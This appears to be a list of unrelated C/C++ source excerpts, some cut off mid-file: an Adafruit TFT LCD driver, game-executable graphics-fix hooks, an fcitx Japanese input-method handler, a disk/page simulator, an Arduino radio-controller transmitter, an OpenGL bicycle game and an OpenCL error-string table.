wrPinSet;\n  *rdPort |= rdPinSet;\n#endif\n#if defined(__SAM3X8E__)\n  csPort->PIO_SODR |= csPinSet; // Set all control bits to HIGH (idle)\n  cdPort->PIO_SODR |= cdPinSet; // Signals are ACTIVE LOW\n  wrPort->PIO_SODR |= wrPinSet;\n  rdPort->PIO_SODR |= rdPinSet;\n#endif\n  pinMode(cs, OUTPUT); // Enable outputs\n  pinMode(cd, OUTPUT);\n  pinMode(wr, OUTPUT);\n  pinMode(rd, OUTPUT);\n  if (reset) {\n    digitalWrite(reset, HIGH);\n    pinMode(reset, OUTPUT);\n  }\n#endif\n\n  init();\n}\n\n// Constructor for shield (fixed LCD control lines)\nAdafruit_TFTLCD::Adafruit_TFTLCD(void) : Adafruit_GFX(TFTWIDTH, TFTHEIGHT) {\n  init();\n}\n\n// Initialization common to both shield & breakout configs\nvoid Adafruit_TFTLCD::init(void) {\n\n#ifdef USE_ADAFRUIT_SHIELD_PINOUT\n  CS_IDLE; // Set all control bits to idle state\n  WR_IDLE;\n  RD_IDLE;\n  CD_DATA;\n  digitalWrite(5, HIGH); // Reset line\n  pinMode(A3, OUTPUT);   // Enable outputs\n  pinMode(A2, OUTPUT);\n  pinMode(A1, OUTPUT);\n  pinMode(A0, OUTPUT);\n  pinMode(5, OUTPUT);\n#endif\n\n  setWriteDir(); // Set up LCD data port(s) for WRITE operations\n\n  rotation = 0;\n  cursor_y = cursor_x = 0;\n  textcolor = 0xFFFF;\n  _width = TFTWIDTH;\n  _height = TFTHEIGHT;\n}\n\n// Initialization command tables for different LCD controllers\n#define TFTLCD_DELAY 0xFF\nstatic const uint8_t HX8347G_regValues[] PROGMEM = {\n    0x2E, 0x89, 0x29, 0x8F, 0x2B, 0x02, 0xE2, 0x00, 0xE4, 0x01, 0xE5, 0x10,\n    0xE6, 0x01, 0xE7, 0x10, 0xE8, 0x70, 0xF2, 0x00, 0xEA, 0x00, 0xEB, 0x20,\n    0xEC, 0x3C, 0xED, 0xC8, 0xE9, 0x38, 0xF1, 0x01,\n\n    // skip gamma, do later\n\n    0x1B, 0x1A, 0x1A, 0x02, 0x24, 0x61, 0x25, 0x5C,\n\n    0x18, 0x36, 0x19, 0x01, 0x1F, 0x88, TFTLCD_DELAY, 5, // delay 5 ms\n    0x1F, 0x80, TFTLCD_DELAY, 5, 0x1F, 0x90, TFTLCD_DELAY, 5, 0x1F, 0xD4,\n    TFTLCD_DELAY, 5, 0x17, 0x05,\n\n    0x36, 0x09, 0x28, 0x38, TFTLCD_DELAY, 40, 0x28, 0x3C,\n\n    0x02, 0x00, 0x03, 0x00, 0x04, 0x00, 0x05, 0xEF, 0x06, 0x00, 0x07, 0x00,\n    0x08, 0x01, 0x09, 0x3F};\n\nstatic const uint8_t HX8357D_regValues[] PROGMEM = {\n    HX8357_SWRESET,\n    0,\n    HX8357D_SETC,\n    3,\n    0xFF,\n    0x83,\n    0x57,\n    TFTLCD_DELAY,\n    250,\n    HX8357_SETRGB,\n    4,\n    0x00,\n    0x00,\n    0x06,\n    0x06,\n    HX8357D_SETCOM,\n    1,\n    0x25, // -1.52V\n    HX8357_SETOSC,\n    1,\n    0x68, // Normal mode 70Hz, Idle mode 55 Hz\n    HX8357_SETPANEL,\n    1,\n    0x05, // BGR, Gate direction swapped\n    HX8357_SETPWR1,\n    6,\n    0x00,\n    0x15,\n    0x1C,\n    0x1C,\n    0x83,\n    0xAA,\n    HX8357D_SETSTBA,\n    6,\n    0x50,\n    0x50,\n    0x01,\n    0x3C,\n    0x1E,\n    0x08,\n    // MEME GAMMA HERE\n    HX8357D_SETCYC,\n    7,\n    0x02,\n    0x40,\n    0x00,\n    0x2A,\n    0x2A,\n    0x0D,\n    0x78,\n    HX8357_COLMOD,\n    1,\n    0x55,\n    HX8357_MADCTL,\n    1,\n    0xC0,\n    HX8357_TEON,\n    1,\n    0x00,\n    HX8357_TEARLINE,\n    2,\n    0x00,\n    0x02,\n    HX8357_SLPOUT,\n    0,\n    TFTLCD_DELAY,\n    150,\n    HX8357_DISPON,\n    0,\n    TFTLCD_DELAY,\n    50,\n};\n\nstatic const uint16_t ILI932x_re",
    "#include \"hook_mgr.hpp\"\n#include \"plugin.hpp\"\n#include \"game_addrs.hpp\"\n\n#include \"d3d9.h\"\n\nclass DisableDPIScaling : public Hook\n{\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"DisableDPIScaling\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::DisableDPIScaling;\n\t}\n\n\tbool apply() override\n\t{\n\t\tSetProcessDPIAware();\n\t\treturn true;\n\t}\n\n\tstatic DisableDPIScaling instance;\n};\nDisableDPIScaling DisableDPIScaling::instance;\n\nclass ScreenEdgeCullFix : public Hook\n{\n\tconst static int CalcBall3D2D_Addr = 0x49E70;\n\n\t// Hook CalcBall3D2D to rescale screen-ratio positions back to 4:3 positions that game code expects\n\t// (fixes objects like cones being culled out before they reach edge of the screen)\n\tinline static SafetyHookInline dest_orig = {};\n\tstatic float __cdecl destination(float a1, Sphere* a2, Sphere* a3)\n\t{\n\t\tfloat ret = dest_orig.ccall<float>(a1, a2, a3);\n\n\t\tconstexpr float ratio_4_3 = 4.f / 3.f;\n\n\t\tfloat ratio_screen = *Game::screen_width / *Game::screen_height;\n\n\t\ta3->f0 = (a3->f0 / ratio_screen) * ratio_4_3;\n\t\ta3->f1 = (a3->f1 * ratio_screen) / ratio_4_3;\n\t\treturn ret;\n\t}\n\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"ScreenEdgeCullFix\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::ScreenEdgeCullFix;\n\t}\n\n\tbool apply() override\n\t{\n\t\tdest_orig = safetyhook::create_inline(Module::exe_ptr(CalcBall3D2D_Addr), destination);\n\t\treturn !!dest_orig;\n\t}\n\n\tstatic ScreenEdgeCullFix instance;\n};\nScreenEdgeCullFix ScreenEdgeCullFix::instance;\n\nclass DisableStageCulling : public Hook\n{\n\tconst static int CalcCulling_PatchAddr = 0x501F;\n\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"DisableStageCulling\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::DisableStageCulling;\n\t}\n\n\tbool apply() override\n\t{\n\t\t// Patch \"if (CheckCulling(...))\" -> no-op\n\t\tMemory::VP::Patch(Module::exe_ptr(CalcCulling_PatchAddr), { 0x90, 0x90 });\n\t\treturn true;\n\t}\n\n\tstatic DisableStageCulling instance;\n};\nDisableStageCulling DisableStageCulling::instance;\n\nclass DisableVehicleLODs : public Hook\n{\n\tconst static int DispOthcar_PatchAddr = 0xAE4E9;\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"DisableVehicleLODs\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::DisableVehicleLODs;\n\t}\n\n\tbool apply() override\n\t{\n\t\t// Patch \"eax = car.LodNumber\" -> \"eax = 0\"\n\t\tMemory::VP::Patch(Module::exe_ptr(DispOthcar_PatchAddr), { 0x90, 0x31, 0xC0 });\n\n\t\treturn true;\n\t}\n\n\tstatic DisableVehicleLODs instance;\n};\nDisableVehicleLODs DisableVehicleLODs::instance;\n\nclass FixZBufferPrecision : public Hook\n{\n\tconst static int CalcCameraMatrix_Addr = 0x84BD0;\n\tconst static int Clr_SceneEffect_Addr = 0xBE70;\n\n\tinline static SafetyHookInline CalcCameraMatrix = {};\n\n\tstatic inline bool allow_znear_override = true;\n\tstatic void CalcCameraMatrix_dest(EvWorkCamera* camera)\n\t{\n\t\t// improve z-buffer precision by increasing znear\n\t\t// game default is 0.1 which reduces precision of far objects massively, causing z-fighting and objects not drawing properly\n\n\t\tif (allow_znear_override)\n\t\t{\n\t\t\t// only set znear to 1 if...\n\t\t\tif ((camera->camera_mode_34A == 2 || camera->camera_mode_34A == 0) // ... in third-person or FPV\n\t\t\t\t&& camera->camera_mode_timer_364 == 0 // ... not switching cameras\n\t\t\t\t&& *Game::current_mode == STATE_GAME) // ... we're in main game state (not in STATE_START cutscene etc)\n\t\t\t{\n\t\t\t\tcamera->perspective_znear_BC = 1.0f;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (camera->camera_mode_timer_364 != 0 || *Game::current_mode != STATE_GAME)\n\t\t\t\t\tcamera->perspective_znear_BC = 0.1f; // set znear to 0.1 during camera switch / cutscene\n\t\t\t\telse\n\t\t\t\t\tcamera->perspective_znear_BC = 0.3f; // 0.3 seems fine for in-car view, doesn't improve as much as 1.0f but still better than 0.1f\n\t\t\t}\n\t\t}\n\t\tCalcCameraMatrix.call(camera);\n\t}\n\n\t// hook Clr_SceneEffect so we can reset camera z-near before screen effects are draw\n\tinline static SafetyHookInline Clr_SceneEffect = {};\n\tstatic void Clr_SceneEffect_dest(int a1)\n\t{\n\t\tFixZBufferPrecision::allow_znear_override = false;\n\n\t\tEvWorkCamera* camera = Module::exe_ptr<EvWorkCamera>(0x39FE10);\n\n\t\tfloat prev = camera->perspective_znear_BC;\n\n\t\t// apply vanilla znear\n\t\tcamera->perspective_znear_BC = 0.05f; // game default = 0.1, but that causes lens flare to slightly clip, 0.05 allows it to fade properly\n\t\tCalcCameraMatrix_dest(camera);\n\n\t\tClr_SceneEffect.call(a1);\n\n\t\t// restore orig znear\n\t\tcamera->perspective_znear_BC = prev;\n\t\tCalcCameraMatrix_dest(camera);\n\n\t\tFixZBufferPrecision::allow_znear_override = true;\n\t}\n\npublic:\n\tstd::string_view description() override\n\t{\n\t\treturn \"FixZBufferPrecision\";\n\t}\n\n\tbool validate() override\n\t{\n\t\treturn Settings::FixZBufferPrecision;\n\t}\n\n\tbool apply() override\n\t{\n\t\tCalcCameraMatrix = safetyhook::create_inline(Module::exe_ptr(CalcCameraMatrix_Addr), CalcCameraMatrix_dest);\n\t\tif (!CalcCameraMatrix)\n\t\t\treturn false;\n\n\t\tClr_SceneEffect = safetyhook::create_inline(Module::exe_ptr(Clr_SceneEffect_Addr), Clr_SceneEffect_dest);\n\t\treturn !!Clr_SceneEffect;\n\t}",
    "#include \"hazkey_state.h\"\n\n#include <algorithm>\n#include <cstring>\n#include <numeric>\n\n#include \"hazkey.h\"\n#include \"hazkey_candidate.h\"\n\nnamespace fcitx {\n\nconstexpr int NormalCandidateListNBest = 9;\nconstexpr int PredictCandidateListNBest = 4;\n\nbool HazkeyState::isInputableEvent(const KeyEvent &event) {\n    auto key = event.key();\n    if (key.check(FcitxKey_space) || key.isSimple() ||\n        (key.sym() >= 0x04a1 && key.sym() <= 0x04df)) {\n        // 0x04a1 - 0x04dd is the range of kana keys\n        return true;\n    }\n    return false;\n}\n\nvoid HazkeyState::keyEvent(KeyEvent &event) {\n    FCITX_DEBUG() << \"HazkeyState keyEvent\";\n\n    auto candidateList = std::dynamic_pointer_cast<HazkeyCandidateList>(\n        event.inputContext()->inputPanel().candidateList());\n\n    if (candidateList != nullptr && candidateList->focused()) {\n        candidateKeyEvent(event, candidateList);\n    } else if (composingText_ != nullptr && candidateList != nullptr) {\n        preeditPredictingKeyEvent(event, candidateList);\n    } else if (composingText_ != nullptr) {\n        preeditKeyEvent(event);\n    } else {\n        auto key = event.key();\n\n        if (key.check(FcitxKey_space)) {\n            if (*engine_->config().spaceStyle == SpaceStyle::Fullwidth) {\n                ic_->commitString(\"\u3000\");\n            } else {\n                ic_->commitString(\" \");\n            }\n        } else if (isInputableEvent(event)) {\n            // Start composing text and enter preedit mode if key is valid\n            composingText_ = kkc_get_composing_text_instance();\n            kkc_input_text(composingText_, engine_->getKkcConfig(),\n                           Key::keySymToUTF8(key.sym()).c_str());\n            showPreeditCandidateList();\n            setHiraganaAUX();\n        } else {\n            // Pass events to the application in the input state\n            return event.filter();\n        }\n        return event.filterAndAccept();\n    }\n    auto newCandidateList = std::dynamic_pointer_cast<HazkeyCandidateList>(\n        ic_->inputPanel().candidateList());\n    if (newCandidateList != nullptr && newCandidateList->focused()) {\n        setCandidateCursorAUX(newCandidateList);\n    } else if (composingText_ != nullptr) {\n        setHiraganaAUX();\n    }\n}\n\nvoid HazkeyState::preeditPredictingKeyEvent(\n    KeyEvent &event,\n    std::shared_ptr<HazkeyCandidateList> PreeditCandidateList) {\n    FCITX_DEBUG() << \"HazkeyState preeditKeyEvent\";\n\n    auto key = event.key();\n    auto keysym = key.sym();\n\n    // TODO: keys should be configurable\n    // TODO: use left and right key to move cursor\n    switch (keysym) {\n        case FcitxKey_Return:\n            preedit_.commitPreedit();\n            reset();\n            break;\n        case FcitxKey_BackSpace:\n            kkc_delete_backward(composingText_);\n            showPreeditCandidateList();\n            break;\n        case FcitxKey_Up:\n        case FcitxKey_Down:\n        case FcitxKey_Tab:\n            PreeditCandidateList->focus();\n            updateCandidateCursor(PreeditCandidateList);\n            break;\n        case FcitxKey_space:\n            showNonPredictCandidateList();\n            advanceCandidateCursor(\n                std::dynamic_pointer_cast<HazkeyCandidateList>(\n                    ic_->inputPanel().candidateList()));\n            break;\n        case FcitxKey_F6:\n            directCharactorConversion(ConversionMode::Hiragana);\n            break;\n        case FcitxKey_F7:\n            directCharactorConversion(ConversionMode::KatakanaFullwidth);\n            break;\n        case FcitxKey_F8:\n            directCharactorConversion(ConversionMode::KatakanaHalfwidth);\n            break;\n        case FcitxKey_F9:\n            directCharactorConversion(ConversionMode::RawFullwidth);\n            break;\n        case FcitxKey_F10:\n            directCharactorConversion(ConversionMode::RawHalfwidth);\n            break;\n        case FcitxKey_Escape:\n            reset();\n            break;\n        case FcitxKey_kana_fullstop:  // kana \"\u3002\" key\n        case FcitxKey_period:\n            if (*engine_->config().autoCommitMode != AutoCommitMode::None) {\n                preedit_.commitPreedit();\n                switch (*engine_->config().periodStyle) {\n                    case PeriodStyle::FullwidthKuten:\n                        ic_->commitString(\"\u3002\");\n                        break;\n                    case PeriodStyle::HalfwidthKuten:\n                        ic_->commitString(\"\uff61\");\n                        break;\n                    case PeriodStyle::FullwidthPeriod:\n                        ic_->commitString(\"\uff0e\");\n                        break;\n                    case PeriodStyle::HalfwidthPeriod:\n                        ic_->commitString(\".\");\n                        break;\n                }\n                reset();\n            } else if (isInputableEvent(event)) {\n                kkc_input_text(composingText_, engine_->getKkcConfig(),\n                               Key::keySymToUTF8(keysym).c_str());\n                showPreed",
    "#include \"Disk.hpp\"\n\n#include <fstream>\n#include <iostream>\n\nusing namespace std;\n\nDisk::Disk() = default;\n\nDisk::~Disk() {\n\tfor (auto& page : pages) {\n\t\tpage->reset();\n\t}\n}\n\nuint Disk::diskWrite(shared_ptr<Page>& p) {\n\tif (pages.size() == DISK_SIZE_IN_PAGE) {\n\t\tcerr << \"Error: can not write to the disk due to out of disk space.\"\n\t\t     << endl;\n\t\texit(1);\n\t}\n\tuint new_disk_page_id = pages.size();\n\tpages.push_back(make_shared<Page>(*p));\n\treturn new_disk_page_id;\n}\n\nPage* Disk::diskRead(uint pos) {\n\tif (pos >= pages.size()) {\n\t\tcerr << \"Error: accessing invalid disk page.\" << endl;\n\t\texit(1);\n\t}\n\treturn pages[pos].get();\n}\n\nvoid Disk::print(uint id) { pages[id]->print(); }\n\nvoid Disk::print() {\n\tfor (uint i = 0; i < pages.size(); i++) {\n\t\tif (pages[i]) {\n\t\t\tcout << \"Disk page id: \" << i << endl;\n\t\t\tpages[i]->print();\n\t\t}\n\t}\n}\n\n/* Different tables should not mix with each other */\npair<uint, uint> Disk::read_data(const char* filename) {\n\t/* Read all the raw data from txt file */\n\tstring str_file_name(filename);\n\tifstream raw_data_file(str_file_name);\n\tstring one_line;\n\tuint start_page_id = pages.size();\n\t/* Create the first new disk page */\n\tpages.push_back(make_shared<Page>());\n\twhile (getline(raw_data_file, one_line)) {\n\t\tif (pages.back()->full()) {\n\t\t\t/* Create a new disk page */\n\t\t\tpages.push_back(make_shared<Page>());\n\t\t}\n\t\tsize_t space_idx = one_line.find(' ');\n\t\tstring key = one_line.substr(0, space_idx);\n\t\tstring data = one_line.substr(space_idx + 1);\n\t\tpages.back()->loadRecord(Record(key, data));\n\t}\n\tuint end_page_id = pages.size();\n\traw_data_file.close();\n\treturn make_pair(start_page_id, end_page_id);\n}",
    "#include <Arduino.h>\r\n#include <SPI.h>\r\n#include <nRF24L01.h>\r\n#include <RF24.h>\r\n#include <Wire.h>\r\n\r\n// Define the digital inputs\r\n#define jB1 0  // Joystick button 1\r\n#define jB2 1  // Joystick button 2\r\n#define t1 4   // Toggle switch 1\r\n#define t2 7   // Toggle switch 1\r\n#define b1 3   // Button 1\r\n#define b2 2   // Button 2\r\n#define b3 9   // Button 3\r\n#define b4 8   // Button 4\r\n\r\nconst int MPU = 0x68; // MPU6050 I2C address\r\nfloat AccX, AccY, AccZ;\r\nfloat GyroX, GyroY, GyroZ;\r\nfloat accAngleX, accAngleY, gyroAngleX, gyroAngleY;\r\nfloat angleX, angleY;\r\nfloat AccErrorX, AccErrorY, GyroErrorX, GyroErrorY;\r\nfloat elapsedTime, currentTime, previousTime;\r\nint c = 0;\r\n\r\nRF24 radio(5, 6);   // nRF24L01 (CE, CSN)\r\nconst byte address[6] = \"00001\"; // Address\r\n// Max size of this struct is 32 bytes - NRF24L01 buffer limit\r\nstruct Data_Package {\r\n  byte j1PotX;\r\n  byte j1PotY;\r\n  byte j1Button;\r\n  byte j2PotX;\r\n  byte j2PotY;\r\n  byte j2Button;\r\n  byte pot1;\r\n  byte pot2;\r\n  byte tSwitch1;\r\n  byte tSwitch2;\r\n  byte button1;\r\n  byte button2;\r\n  byte button3;\r\n  byte button4;\r\n  byte roll;\r\n  byte pitch;\r\n};\r\nData_Package data; //Create a variable with the above structure\r\n\r\n\r\n  \r\nvoid initialize_MPU6050() {\r\n  Wire.begin();                      // Initialize comunication\r\n  Wire.beginTransmission(MPU);       // Start communication with MPU6050 // MPU=0x68\r\n  Wire.write(0x6B);                  // Talk to the register 6B\r\n  Wire.write(0x00);                  // Make reset - place a 0 into the 6B register\r\n  Wire.endTransmission(true);        //end the transmission\r\n  // Configure Accelerometer\r\n  Wire.beginTransmission(MPU);\r\n  Wire.write(0x1C);                  //Talk to the ACCEL_CONFIG register\r\n  Wire.write(0x10);                  //Set the register bits as 00010000 (+/- 8g full scale range)\r\n  Wire.endTransmission(true);\r\n  // Configure Gyro\r\n  Wire.beginTransmission(MPU);\r\n  Wire.write(0x1B);                   // Talk to the GYRO_CONFIG register (1B hex)\r\n  Wire.write(0x10);                   // Set the register bits as 00010000 (1000dps full scale)\r\n  Wire.endTransmission(true);\r\n}\r\n\r\n//\u6b64\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u7ea0\u6b63\u8bef\u5dee\uff0c\u82e5\u60f3\u4e86\u89e3\u7528\u6cd5\u53ef\u53c2\u8003https://howtomechatronics.com/tutorials/arduino/arduino-and-mpu6050-accelerometer-and-gyroscope-tutorial/\r\nvoid calculate_IMU_error() {\r\n  // We can call this funtion in the setup section to calculate the accelerometer and gury data error. From here we will get the error values used in the above equations printed on the Serial Monitor.\r\n  // Note that we should place the IMU flat in order to get the proper values, so that we then can the correct values\r\n  // Read accelerometer values 200 times\r\n  while (c < 200) {\r\n    Wire.beginTransmission(MPU);\r\n    Wire.write(0x3B);\r\n    Wire.endTransmission(false);\r\n    Wire.requestFrom(MPU, 6, true);\r\n    AccX = (Wire.read() << 8 | Wire.read()) / 4096.0 ;\r\n    AccY = (Wire.read() << 8 | Wire.read()) / 4096.0 ;\r\n    AccZ = (Wire.read() << 8 | Wire.read()) / 4096.0 ;\r\n    // Sum all readings\r\n    AccErrorX = AccErrorX + ((atan((AccY) / sqrt(pow((AccX), 2) + pow((AccZ), 2))) * 180 / PI));\r\n    AccErrorY = AccErrorY + ((atan(-1 * (AccX) / sqrt(pow((AccY), 2) + pow((AccZ), 2))) * 180 / PI));\r\n    c++;\r\n  }\r\n  //Divide the sum by 200 to get the error value\r\n  AccErrorX = AccErrorX / 200;\r\n  AccErrorY = AccErrorY / 200;\r\n  c = 0;\r\n  // Read gyro values 200 times\r\n  while (c < 200) {\r\n    Wire.beginTransmission(MPU);\r\n    Wire.write(0x43);\r\n    Wire.endTransmission(false);\r\n    Wire.requestFrom(MPU, 4, true);\r\n    GyroX = Wire.read() << 8 | Wire.read();\r\n    GyroY = Wire.read() << 8 | Wire.read();\r\n    // Sum all readings\r\n    GyroErrorX = GyroErrorX + (GyroX / 32.8);\r\n    GyroErrorY = GyroErrorY + (GyroY / 32.8);\r\n    c++;\r\n  }\r\n  //Divide the sum by 200 to get the error value\r\n  GyroErrorX = GyroErrorX / 200;\r\n  GyroErrorY = GyroErrorY / 200;\r\n  // Print the error values on the Serial Monitor\r\n  Serial.print(\"AccErrorX: \");\r\n  Serial.println(AccErrorX);\r\n  Serial.print(\"AccErrorY: \");\r\n  Serial.println(AccErrorY);\r\n  Serial.print(\"GyroErrorX: \");\r\n  Serial.println(GyroErrorX);\r\n  Serial.print(\"GyroErrorY: \");\r\n  Serial.println(GyroErrorY);\r\n}\r\nvoid read_IMU() {\r\n  // === Read acceleromter data === //\r\n  Wire.beginTransmission(MPU);\r\n  Wire.write(0x3B); // Start with register 0x3B (ACCEL_XOUT_H)\r\n  Wire.endTransmission(false);\r\n  Wire.requestFrom(MPU, 6, true); // Read 6 registers total, each axis value is stored in 2 registers\r\n  //For a range of +-8g, we need to divide the raw values by 4096, according to the datasheet\r\n  AccX = (Wire.read() << 8 | Wire.read()) / 4096.0; // X-axis value\r\n  AccY = (Wire.read() << 8 | Wire.read()) / 4096.0; // Y-axis value\r\n  AccZ = (Wire.read() << 8 | Wire.read()) / 4096.0; // Z-axis value\r\n  // Calculating angle values using\r\n  accAngleX = (atan(AccY / sqrt(pow(AccX, 2) + pow(AccZ, 2))) * 180 / PI) + 1.15; // AccErrorX ~(-1.15) See the calculate_IMU_error()custom function for more details\r\n  accAngleY = (atan(-1 * AccX / sqrt(pow(AccY, 2",
    "//  GKV Game Sepeda\r\n// Anggota Kelompok\r\n// Naufal Rizki Saputra\t\t\t(24060122120011)\r\n// Muflih Muhammad Imaduddin\t(24060122140103)\r\n// Fikri Azka Pradya\t\t\t(24060122140171)\r\n// Ilhma Azrinargana Pulungan\t(24060122140130)\r\n\r\n#include <windows.h>\r\n#ifndef M_PI\r\n#define M_PI 3.14159265358979323846\r\n#define HANDLE_MAJU   50.0f //Batas maju\r\n#define HANDLE_MUNDUR  100.0f // Batas mundur\r\n#define HANDLE_STOP  \t0.0f // Batas stop/tengah\r\n#define INC_STEERING   10.0f // inc_stang belok\r\n#define INC_SPEED      5.0f // inc_gowes\r\n#endif\r\n\r\n#include <GL/glut.h>\r\n#include <math.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n\r\n#include \"sepeda.h\"\r\n#include \"lantai.h\"\r\n#include \"randomobject.h\"\r\n\r\nfloat angle = 8.0;\r\nfloat deltaAngle = 0.0;\r\nfloat ratio;\r\nfloat deltaMove = 0,h,w; //for debug cam\r\nint bitmapHeight=12;\r\nextern float pedalAngle, speed, steering;\r\n//debug and dev\r\nint debugCamera = 0;\r\n\r\n//global var buat game mechanics\r\nfloat speedX = 0.0, speedZ = 0.0; //pergerakan truk\r\nfloat putaranSepeda = 90.0; //jgn di set negatif\r\nint gasDitekan = 0;\r\nint setirDitekan = 0; //-1 kiri 1 kanan 0 gak ditekan\r\nfloat akselerasiDefault = 0.2;\r\nfloat akselerasi = 0.0;\r\nfloat dekselerasi = 0.05;\r\nfloat cx=0.0, cy=0.0, cz=0.0;\r\nfloat x=22.5f,y=10.0f,z=22.5f; // posisi awal kamera\r\nfloat angleCam = 90.0; //jgn di set negatif\r\nfloat lx=0.0f,ly=0.0f,lz=-1.0f;\r\nfloat tx=0.0, ty=0.0, tz=0.0; //posisi sepeda (jgn diubah)\r\nextern float cpDepanX, cpDepanZ, cpBelakangX, cpBelakangZ;//shared global variable collision point\r\n\r\n//renders\r\nint buildings = 1; //seluruh bangunan memakai ini, 0 = seluruh bangunan hilang\r\nint c0x=350.0 , c0z= 410.0;\r\nint c1x=10.0, c1z=-190.0;\r\nint c2x=-330.0, c2z=-200.0;\r\nint c3x=-340.0, c3z=390.0;\r\nint c4x=-30.0, c4z=-210.0;\r\nint c5x=-10.0, c5z=580.0;\r\nint c6x=350.0, c6z=-320.0;\r\nint c7x=-350.0, c7z=-200.0;\r\nint c8x=30.0, c8z=300.0;\r\nint c9x=330.0, c9z=300.0;\r\n\r\nvoid Reshape(int w1, int h1){\r\n    // Fungsi reshape\r\n    if(h1 == 0) h1 = 1;\r\n    w = w1;\r\n    h = h1;\r\n    ratio = 1.0f * w / h;\r\n    glMatrixMode(GL_PROJECTION);\r\n    glLoadIdentity();\r\n    glViewport(0, 0, w, h);\r\n    gluPerspective(45,ratio,0.1,500);\r\n    glMatrixMode(GL_MODELVIEW);\r\n    glLoadIdentity();\r\n    gluLookAt(tx, y, tz, x + lx,y + ly,z + lz, 0.0f,1.0f,0.0f);\r\n}\r\n\r\nvoid moveCamFlat(float i){\r\n    //kamera ingame\r\n    glLoadIdentity();\r\n    i = i - 90;\r\n    gluLookAt(tx+x*sin(i*M_PI/180), y, tz+z*cos(i*M_PI/180), tx, ty+y/2, tz, 0.0f,1.0f,0.0f);\r\n}\r\n\r\n\r\nvoid orientMe(float ang){\r\n    //kamera debug\r\n    // Fungsi ini untuk memutar arah kamera (tengok kiri/kanan)\r\n    lx = sin(ang);\r\n    lz = -cos(ang);\r\n    glLoadIdentity();\r\n    gluLookAt(cx, y, cz, cx + lx,y + ly,cz + lz, 0.0f,1.0f,0.0f);\r\n}\r\n\r\nvoid moveMeFlat(float i){\r\n    //kamera debug\r\n    // Fungsi ini untuk maju mundur kamera\r\n    cx = cx + i*(lx)*0.1;\r\n    cz = cz + i*(lz)*0.1;\r\n    glLoadIdentity();\r\n    gluLookAt(cx, y, cz, cx + lx,y + ly,cz + lz, 0.0f,1.0f,0.0f);\r\n}\r\n\r\nvoid moveSepeda(float putaran, float deltaX){\r\n    float deltaMundur = float(abs(180-putaran));\r\n    tx = tx + (deltaX)*0.1*(90.0-deltaMundur)/-90;\r\n    tz = tz + (deltaX)*0.1*-sin(putaran*M_PI/180)*(1-abs((90.0-deltaMundur)/-90));\r\n}\r\n\r\nint cekTabrakan(Objek objek, int *existance) {\r\n    float oMinX, oMaxX, oMinZ, oMaxZ; //objek min x, objek max x, dll.\r\n    //jarak dari kaca depan truk ke koordinat ditengah(0,0,0) itu 10.3\r\n\r\n    oMinX = objek.getX() - (objek.getSize()/2) - 1.6; //lebar truk 3.2 (kiri 1,6, kanan 1,6);\r\n    oMaxX = objek.getX() + (objek.getSize()/2) + 1.6;\r\n    oMinZ = objek.getZ() - (objek.getSize()/2) - 1.6;\r\n    oMaxZ = objek.getZ() + (objek.getSize()/2) + 1.6;\r\n\r\n    if(cpDepanX >= oMinX && cpDepanX <= oMaxX && cpDepanZ >= oMinZ && cpDepanZ <= oMaxZ){\r\n        if (!objek.getHitValue()){\r\n            if (speedX>0){\r\n                speedX = 0.0;\r\n            }\r\n        }else{\r\n            *existance = 0;\r\n            return 1;\r\n        }\r\n    }\r\n\r\n    if(cpBelakangX >= oMinX && cpBelakangX <= oMaxX && cpBelakangZ >= oMinZ && cpBelakangZ <= oMaxZ){\r\n         if (!objek.getHitValue()){\r\n            if (speedX<0){\r\n                speedX = 0.0;\r\n            }\r\n        }else{\r\n            *existance = 0;\r\n            return 1;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\n\r\nvoid setOrthographicProjection() {\r\n\tglMatrixMode(GL_PROJECTION);\r\n\tglPushMatrix();\r\n\tglLoadIdentity();\r\n\tgluOrtho2D(0, w, h, 0);\r\n\tglMatrixMode(GL_MODELVIEW);\r\n}\r\n\r\nvoid restorePerspectiveProjection() {\r\n\tglMatrixMode(GL_PROJECTION);\r\n\tglPopMatrix();\r\n\tglMatrixMode(GL_MODELVIEW);\r\n}\r\n\r\nvoid display() {\r\n    glClearColor(0.64, 0.79, 0.99, 0);\r\n    \r\n    if (!debugCamera){\r\n        if (speedX){\r\n            moveSepeda(putaranSepeda, speedX*2);\r\n        }\r\n        if (!gasDitekan){\r\n            if (speedX>0.1){\r\n                deltaMove -= dekselerasi;\r\n                speedX -= dekselerasi;\r\n            }else if (speedX<-0.1){\r\n                deltaMove += dekselerasi;\r\n                speedX += dekselerasi;\r\n  ",
    "#include <wideopencl/error.h>\n\n\nnamespace wideopencl{\n\n\nstd::string error_string(cl_int error){\n\tswitch(error){\n\tcase CL_SUCCESS: return \"CL_SUCCESS\";\n\tcase CL_DEVICE_NOT_FOUND: return \"CL_DEVICE_NOT_FOUND\";\n\tcase CL_DEVICE_NOT_AVAILABLE: return \"CL_DEVICE_NOT_AVAILABLE\";\n\tcase CL_COMPILER_NOT_AVAILABLE: return \"CL_COMPILER_NOT_AVAILABLE\";\n\tcase CL_MEM_OBJECT_ALLOCATION_FAILURE: return \"CL_MEM_OBJECT_ALLOCATION_FAILURE\";\n\tcase CL_OUT_OF_RESOURCES: return \"CL_OUT_OF_RESOURCES\";\n\tcase CL_OUT_OF_HOST_MEMORY: return \"CL_OUT_OF_HOST_MEMORY\";\n\tcase CL_PROFILING_INFO_NOT_AVAILABLE: return \"CL_PROFILING_INFO_NOT_AVAILABLE\";\n\tcase CL_MEM_COPY_OVERLAP: return \"CL_MEM_COPY_OVERLAP\";\n\tcase CL_IMAGE_FORMAT_MISMATCH: return \"CL_IMAGE_FORMAT_MISMATCH\";\n\tcase CL_IMAGE_FORMAT_NOT_SUPPORTED: return \"CL_IMAGE_FORMAT_NOT_SUPPORTED\";\n\tcase CL_BUILD_PROGRAM_FAILURE: return \"CL_BUILD_PROGRAM_FAILURE\";\n\tcase 